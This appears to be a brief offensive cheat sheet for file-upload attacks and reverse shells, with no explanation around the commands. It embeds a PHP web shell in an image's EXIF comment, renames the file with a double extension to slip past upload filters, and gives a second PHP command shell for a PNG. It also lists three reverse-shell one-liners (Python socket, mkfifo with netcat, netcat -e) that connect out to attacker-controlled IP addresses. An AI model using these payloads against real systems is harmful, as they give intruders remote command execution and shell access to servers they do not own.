### Using exiftool
      exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' normal.jpg
      mv normal.jpg normal.php.jpg
### Vim edit png
      <?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
### reverse shells
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4444));os.dup2(s.fileno(),0);              os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.4 4444 >/tmp/f
      nc -e /bin/sh 10.0.0.1 1234
